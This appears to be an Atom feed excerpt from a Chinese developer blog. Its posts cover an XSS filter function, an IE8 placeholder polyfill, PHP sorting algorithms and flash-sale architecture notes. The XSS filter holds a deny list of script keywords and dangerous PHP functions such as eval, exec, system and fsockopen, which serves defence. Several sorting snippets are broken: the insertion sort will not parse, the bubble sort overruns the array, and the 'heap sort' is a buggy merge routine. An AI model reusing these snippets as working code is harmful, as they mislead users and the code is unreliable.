</pre></td><td class='code'><pre><code class=''><span class='line'>不要让用户写入任何script和发起恶意http请求的东西
</span><span class='line'>htmlspecialchars处理</span></code></pre></td></tr></table></div></figure>


<h2>防止xss攻击（不是我写的）</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>function xss_clean($str, $is_image = FALSE)
</span><span class='line'>{
</span><span class='line'>  if (is_array($str))
</span><span class='line'>  {
</span><span class='line'>      while (list($key) = each($str))
</span><span class='line'>      {
</span><span class='line'>          $str[$key] = $this->xss_clean($str[$key]);
</span><span class='line'>      }
</span><span class='line'>
</span><span class='line'>      return $str;
</span><span class='line'>  }
</span><span class='line'>
</span><span class='line'>  $str = remove_invisible_characters($str);
</span><span class='line'>
</span><span class='line'>  $str = $this->_validate_entities($str);
</span><span class='line'>
</span><span class='line'>  $str = rawurldecode($str);
</span><span class='line'>
</span><span class='line'>  $str = preg_replace_callback("/[a-z]+=([\'\"]).*?\\1/si", array($this, '_convert_attribute'), $str);
</span><span class='line'>
</span><span class='line'>  $str = preg_replace_callback("/&lt;\w+.*?(?=>|&lt;|$)/si", array($this, '_decode_entity'), $str);
</span><span class='line'>
</span><span class='line'>  $str = remove_invisible_characters($str);
</span><span class='line'>  if (strpos($str, "\t") !== FALSE)
</span><span class='line'>  {
</span><span class='line'>      $str = str_replace("\t", ' ', $str);
</span><span class='line'>  }
</span><span class='line'>
</span><span class='line'>  $converted_string = $str;
</span><span class='line'>
</span><span class='line'>  $str = $this->_do_never_allowed($str);
</span><span class='line'>
</span><span class='line'>  if ($is_image === TRUE)
</span><span class='line'>  {
</span><span class='line'>      $str = preg_replace('/&lt;\?(php)/i', "&lt;?\\1", $str);
</span><span class='line'>  }
</span><span class='line'>  else
</span><span class='line'>  {
</span><span class='line'>      $str = str_replace(array('&lt;?', '?'.'>'),  array('&lt;?', '?&gt;'), $str);
</span><span class='line'>  }
</span><span class='line'>
</span><span class='line'>  $words = array(
</span><span class='line'>      'javascript', 'expression', 'vbscript', 'script', 'base64',
</span><span class='line'>      'applet', 'alert', 'document', 'write', 'cookie', 'window'
</span><span class='line'>  );
</span><span class='line'>
</span><span class='line'>  foreach ($words as $word)
</span><span class='line'>  {
</span><span class='line'>      $temp = '';
</span><span class='line'>
</span><span class='line'>      for ($i = 0, $wordlen = strlen($word); $i &lt; $wordlen; $i++)
</span><span class='line'>      {
</span><span class='line'>          $temp .= substr($word, $i, 1)."\s*";
</span><span class='line'>      }
</span><span class='line'>
</span><span class='line'>      $str = preg_replace_callback('#('.substr($temp, 0, -3).')(\W)#is', array($this, '_compact_exploded_words'), $str);
</span><span class='line'>  }
</span><span class='line'>
</span><span class='line'>  do
</span><span class='line'>  {
</span><span class='line'>      $original = $str;
</span><span class='line'>
</span><span class='line'>      if (preg_match("/&lt;a/i", $str))
</span><span class='line'>      {
</span><span class='line'>          $str = preg_replace_callback("#&lt;a\s+([^>]*?)(>|$)#si", array($this, '_js_link_removal'), $str);
</span><span class='line'>      }
</span><span class='line'>
</span><span class='line'>      if (preg_match("/&lt;img/i", $str))
</span><span class='line'>      {
</span><span class='line'>          $str = preg_replace_callback("#&lt;img\s+([^>]*?)(\s?/?>|$)#si", array($this, '_js_img_removal'), $str);
</span><span class='line'>      }
</span><span class='line'>
</span><span class='line'>      if (preg_match("/script/i", $str) OR preg_match("/xss/i", $str))
</span><span class='line'>      {
</span><span class='line'>          $str = preg_replace("#&lt;(/*)(script|xss)(.*?)\>#si", '[removed]', $str);
</span><span class='line'>      }
</span><span class='line'>  }
</span><span class='line'>  while($original != $str);
</span><span class='line'>
</span><span class='line'>  unset($original);
</span><span class='line'>  $str = $this->_remove_evil_attributes($str, $is_image);
</span><span class='line'>  $naughty = 'alert|applet|audio|basefont|base|behavior|bgsound|blink|body|embed|expression|form|frameset|frame|head|html|ilayer|iframe|input|isindex|layer|link|meta|object|plaintext|style|script|textarea|title|video|xml|xss';
</span><span class='line'>  $str = preg_replace_callback('#&lt;(/*\s*)('.$naughty.')([^>&lt;]*)([>&lt;]*)#is', array($this, '_sanitize_naughty_html'), $str);
</span><span class='line'>  $str = preg_replace('#(alert|cmd|passthru|eval|exec|expression|system|fopen|fsockopen|file|file_get_contents|readfile|unlink)(\s*)\((.*?)\)#si', "\\1\\2&#40;\\3&#41;", $str);
</span><span class='line'>
</span><span class='line'>  $str = $this->_do_never_allowed($str);
</span><span class='line'>
</span><span class='line'>  if ($is_image === TRUE)
</span><span class='line'>  {
</span><span class='line'>      return ($str == $converted_string) ? TRUE: FALSE;
</span><span class='line'>  }
</span><span class='line'>
</span><span class='line'>  log_message('debug', "XSS Filtering completed");
</span><span class='line'>  return $str;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[h5的兼容问题]]></title>
    <link href="http://ztlblog.github.io/blog/2015/06/19/other001/"/>
    <updated>2015-06-19T17:14:30+08:00</updated>
    <id>http://ztlblog.github.io/blog/2015/06/19/other001</id>
    <content type="html"><![CDATA[<h2>h5 下面placeholder 在IE8中不支持，本来想不写js的，唉&hellip; 万恶的IE啊！！！</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>if( !('placeholder' in document.createElement('input')) ){   
</span><span class='line'>    $('input[placeholder],textarea[placeholder]').each(function(){    
</span><span class='line'>      var that = $(this),    
</span><span class='line'>      text= that.attr('placeholder');    
</span><span class='line'>      if(that.val()===""){    
</span><span class='line'>        that.val(text).addClass('placeholder');    
</span><span class='line'>      }    
</span><span class='line'>      that.focus(function(){    
</span><span class='line'>        if(that.val()===text){    
</span><span class='line'>          that.val("").removeClass('placeholder');    
</span><span class='line'>        }    
</span><span class='line'>      })    
</span><span class='line'>      .blur(function(){    
</span><span class='line'>        if(that.val()===""){    
</span><span class='line'>          that.val(text).addClass('placeholder');    
</span><span class='line'>        }    
</span><span class='line'>      })       
</span><span class='line'>    });    
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[php经典排序算法]]></title>
    <link href="http://ztlblog.github.io/blog/2015/06/19/php002/"/>
    <updated>2015-06-19T10:25:07+08:00</updated>
    <id>http://ztlblog.github.io/blog/2015/06/19/php002</id>
    <content type="html"><![CDATA[<figure class='code'><figcaption><span>冒泡排序 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>function bubble_sort($arr)
</span><span class='line'>{
</span><span class='line'>  $len = count($arr);
</span><span class='line'>  for($i=0;$i&lt;$len;$i++)
</span><span class='line'>  {
</span><span class='line'>      for($j=1;$j&lt;$len-$i;$j++)
</span><span class='line'>      {
</span><span class='line'>          if($arr[$j]>$arr[$j+1])
</span><span class='line'>          {
</span><span class='line'>              $temp      = $arr[$j];
</span><span class='line'>              $arr[$j]   = $arr[$j+1];
</span><span class='line'>              $arr[$j+1] = $temp;
</span><span class='line'>          }
</span><span class='line'>      }
</span><span class='line'>  }
</span><span class='line'>  return $arr;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>快速排序 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>function quite_sort($arr)
</span><span class='line'>{
</span><span class='line'>  $len = count($arr);
</span><span class='line'>  if($len &lt;= 1)
</span><span class='line'>  {
</span><span class='line'>      return $arr;    
</span><span class='line'>  }
</span><span class='line'>  $key = $arr[0];
</span><span class='line'>  $left_arr = array();
</span><span class='line'>  $right_arr = array();
</span><span class='line'>  for($i=1;$i&lt;$len;$i++)
</span><span class='line'>  {
</span><span class='line'>      if($key > $arr[$i])
</span><span class='line'>      {
</span><span class='line'>          $left_arr[] = $arr[$i];
</span><span class='line'>      }else
</span><span class='line'>      {
</span><span class='line'>          $right_arr[] = $arr[$i];
</span><span class='line'>      }
</span><span class='line'>  }
</span><span class='line'>  
</span><span class='line'>  $left_arr = quite_sort($left_arr);
</span><span class='line'>  $right_arr = quite_sort($right_arr);
</span><span class='line'>
</span><span class='line'>  return array_merge($left_arr,array($key),$right_arr);
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>选择排序 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>思路：每次选择一个相应的元素，然后将其放到指定的位置
</span><span class='line'>function select_sort($arr)
</span><span class='line'>{
</span><span class='line'>  $len = count($arr);
</span><span class='line'>  for($i=0;$i&lt;$len;$i++)
</span><span class='line'>  {
</span><span class='line'>      $minInx = $i;
</span><span class='line'>      for($j=$i;$j&lt;$len;$j++)
</span><span class='line'>      {
</span><span class='line'>          if($arr[$minInx] > $arr[$j])
</span><span class='line'>          {
</span><span class='line'>              $minInx = $j;
</span><span class='line'>          }
</span><span class='line'>      }
</span><span class='line'>  
</span><span class='line'>      if($minInx != $i)
</span><span class='line'>      {
</span><span class='line'>          $temp     = $arr[$i];
</span><span class='line'>          $arr[$i]  = $arr[$minInx];
</span><span class='line'>          $arr[$minInx] = $temp;
</span><span class='line'>      }
</span><span class='line'>
</span><span class='line'>  }
</span><span class='line'>  return $arr;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>插入排序 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>思路：将要排序的元素插入到已经假定排序好的数组的指定位置
</span><span class='line'>function insert_sort($arr)
</span><span class='line'>{
</span><span class='line'>  $len = count($arr);
</span><span class='line'>  for($i=1;$i&lt;$len;$i++)
</span><span class='line'>  {
</span><span class='line'>      $temp = $arr[$i];
</span><span class='line'>      for($j=$i-1;$j>=0;$j--)
</span><span class='line'>      {
</span><span class='line'>          if($temp &lt; $arr[$j])
</span><span class='line'>          {
</span><span class='line'>              $arr[$j+1] = $arr[$j];
</span><span class='line'>              $arr[$j]   = $temp;
</span><span class='line'>          }   
</span><span class='line'>      }else
</span><span class='line'>      {
</span><span class='line'>          break;
</span><span class='line'>      }
</span><span class='line'>  }
</span><span class='line'>  return $arr;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>堆排序 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>function margeArr($arr1,$arr2)
</span><span class='line'>{
</span><span class='line'>  $a_1 = 0;
</span><span class='line'>  $b_1 = 0;
</span><span class='line'>  $arrA = count($arr1);
</span><span class='line'>  $arrB = count($arr2);
</span><span class='line'>  
</span><span class='line'>  while($a_1 &lt; $arrA && $b_1 &lt; $arrB)
</span><span class='line'>  {
</span><span class='line'>      if($arr1[$a_1] &lt; $arr2[$b_1])
</span><span class='line'>      {
</span><span class='line'>          $arrC[] = $arr1[$a_1++];
</span><span class='line'>      }else
</span><span class='line'>      {
</span><span class='line'>          $arrC[] = $arr[$b_1++];
</span><span class='line'>      }
</span><span class='line'>  }
</span><span class='line'>
</span><span class='line'>  while($a_1 &lt; $arrA)
</span><span class='line'>  {
</span><span class='line'>      $arrC[] = $arr1[$a_1++];
</span><span class='line'>  }
</span><span class='line'>
</span><span class='line'>  while($b_1 &lt; $arrB)
</span><span class='line'>  {
</span><span class='line'>      $arrC[] = $arr2[$b_1++];
</span><span class='line'>  }
</span><span class='line'>
</span><span class='line'>  return $arrC;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[秒杀系统架构优化思路]]></title>
    <link href="http://ztlblog.github.io/blog/2015/06/17/php001/"/>
    <updated>2015-06-17T11:39:18+08:00</updated>
    <id>http://ztlblog.github.io/blog/2015/06/17/php001</id>
    <content type="html"><![CDATA[<h2>秒杀系统挂的主要原因（数据读写锁冲突严重）</h2>

<figure class='code'><figcaption><span>常见架构 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>浏览器->站点->服务->数据
</span><span class='line'>浏览器端最上层，会执行一些js
</span><span class='line'>站点层，会访问后端数据，拼html页面返回给浏览器
</span><span class='line'>服务层，会向上游屏蔽数据细节
</span><span class='line'>数据层，最终的库存是存在这里的</span></code></pre></td></tr></table></div></figure>


<h2>优化细节</h2>

<figure class='code'><figcaption><span>浏览器层请求拦截 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>作为用户点击'查询'按钮之后，由于系统太卡页面打不开，一般用户会继续点，这样会给服务器带来更大的负载
</span><span class='line'>产品层面： 用户点击'查询'或'购票'后，按钮变灰，禁止用户重复提交请求
</span><span class='line'>js层面： 限制用户在x秒之后只能提交一次请求</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>站点层请求拦截 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>产品层面只能拦住小白用户，高端程序员根本不吃这一套，写一个for循环，直接调用你的后端的http请求
</span><span class='line'>解决办法：
</span><span class='line'>同一个uid，限制访问频率，做页面缓存，x秒达到站点层的请求，均返回同一个页面
</span><span class='line'>同一个item的查询，做页面缓存，x秒内到达站点的请求，均返回同一个页面</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>服务层请求拦截 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>站点层的请求拦截，只能拦截程序员，高级黑客可以通过肉鸡注入，这下uid的限制就不行了
</span><span class='line'>解决办法：
</span><span class='line'>对于写请求，做请求队列，每次只透过有限的写请求去数据层，如果均成功再放下一批，如果库存不够则队列里面的写请求全部返回'已售完'
</span><span class='line'>对于读请求，可以做缓存(memcache,redis...)</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
</feed>
